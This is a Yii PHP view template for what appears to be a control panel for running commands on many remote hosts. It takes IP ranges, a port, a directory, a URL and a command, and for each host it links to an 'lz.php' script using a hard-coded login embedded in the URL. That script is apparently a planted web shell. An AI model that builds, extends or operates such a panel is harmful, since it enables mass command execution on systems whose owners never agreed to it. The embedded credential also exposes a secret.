<?php

	use yii\helpers\Html;
	use yii\widgets\ActiveForm;

	/* @var $this yii\web\View */
	/* @var $model app\models\ConsoleForm */
	/* @var $form yii\widgets\ActiveForm */
?>

<div class="posts-form">

	<?php $form = ActiveForm::begin(); ?>

	<?= $form->field($model, 'ip')->textarea(['rows' => 6]) ?>

	<?= $form->field($model, 'except_ip')->textarea(['rows' => 6]) ?>

	<?= $form->field($model, 'port')->textInput() ?>

	<?= $form->field($model, 'dir')->textInput() ?>

	<?= $form->field($model, 'url')->textInput() ?>

	<?= $form->field($model, 'command')->textarea(['rows' => 6]) ?>

	<div class="form-group">
		<?= Html::submitButton('GO Baby!',['class'=>'btn btn-success']) ?>
	</div>

	<?php
		if(!empty($model->ip_list)):
		foreach ($model->ip_list as $key ): ?>

	<div class="navbar">
		<div class="navbar-inner">
			<a class="brand" href="<?php echo sprintf("http://support:tErm1n4L@%s:%s/lz.php", $key, $model->port); ?>"><?php echo sprintf("%s", $key); ?></a>

	<?php endforeach ?>
		<?php endif ?>
	<?php ActiveForm::end(); ?>


</div>
